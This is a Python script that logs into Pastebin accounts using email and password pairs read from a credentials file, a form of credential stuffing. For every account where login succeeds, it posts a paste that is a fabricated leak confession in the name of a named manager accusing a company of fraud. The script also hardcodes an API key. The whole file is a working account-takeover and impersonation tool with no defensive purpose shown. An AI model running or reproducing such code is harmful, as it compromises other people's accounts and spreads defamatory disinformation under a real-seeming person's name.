
import requests

# Pastebin API Developer Key
api_dev_key = 'WMxEEQxG4zyALT7Ky4JhLqyYQAIpyoap'

# Paste content settings
paste_title = 'I’m a Manager at XXX Corp. This Is the Truth'
paste_content = (
    "I am Xiang Li, a manager at XXX Corporation.\n"
    "I can no longer stay silent about the unethical practices happening within our company.\n"
    "We have been knowingly selling outdated, expired video content to our clients while claiming it is new and exclusive.\n"
    "Several junior employees have raised concerns, but upper management ignored them.\n"
    "Some staff were even threatened with termination if they spoke up.\n"
    "This is a deliberate act of deception and fraud, and the public deserves to know the truth.\n"
    "I am leaking this anonymously out of fear of retaliation, but everything stated here is true.\n"
)

paste_expiry = '10M'
paste_format = 'text'

# Read credentials from file
with open('credentials.txt', 'r') as f:
    lines = f.readlines()

for line in lines:
    email, password = line.strip().split(',')
    username = email.split('@')[0]

    print(f'Trying login for account: {username} with password: {password}')

    # Attempt login
    login_data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password
    }

    login_response = requests.post('https://pastebin.com/api/api_login.php', data=login_data)

    if login_response.status_code == 200 and not login_response.text.startswith('Bad API request'):
        api_user_key = login_response.text.strip()
        print(f'Login successful for {username}')

        # Post a private paste using the target account
        paste_data = {
            'api_dev_key': api_dev_key,
            'api_user_key': api_user_key,
            'api_option': 'paste',
            'api_paste_code': paste_content,
            'api_paste_private': '2',
            'api_paste_name': paste_title,
            'api_paste_expire_date': paste_expiry,
            'api_paste_format': paste_format
        }

        paste_response = requests.post('https://pastebin.com/api/api_post.php', data=paste_data)

        if paste_response.status_code == 200 and not paste_response.text.startswith('Bad API request'):
            print(f'Paste created: {paste_response.text}')
        else:
            print('Paste creation failed:', paste_response.text)
    else:
        print('Login failed:', login_response.text)
